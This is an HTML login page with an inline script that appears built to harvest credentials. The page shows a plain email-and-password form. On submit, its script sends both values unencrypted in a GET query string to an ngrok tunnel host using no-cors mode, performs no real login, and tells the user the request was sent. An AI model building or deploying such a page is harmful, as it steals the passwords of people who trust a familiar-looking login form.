<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
      background-color: #f4f4f4;
    }
    .login-container {
      background: white;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .login-container h2 {
      margin-bottom: 1rem;
    }
    .login-container input {
      width: 100%;
      padding: 0.5rem;
      margin: 0.5rem 0 1rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-container button {
      width: 100%;
      padding: 0.5rem;
      background-color: #007bff;
      border: none;
      color: white;
      border-radius: 4px;
      cursor: pointer;
    }
    .login-container button:hover {
      background-color: #0056b3;
    }
    #message {
      margin-top: 1rem;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Login</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
    <div id="message"></div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const email = encodeURIComponent(document.getElementById('email').value);
      const password = encodeURIComponent(document.getElementById('password').value);
      const targetURL = `https://8a81-2409-40f2-2088-39e3-cd3c-faee-1fcc-1c00.ngrok-free.app/login?email=${email}&password=${password}`;

      
      fetch(targetURL, {
        method: 'GET',
        mode: 'no-cors' 
      })
      .then(() => {
        document.getElementById('message').innerText = 'Login request sent.';
      })
      .catch((error) => {
        console.error('Request failed:', error);
        document.getElementById('message').innerText = 'Failed to send request.';
      });
    });
  </script>
</body>
</html>
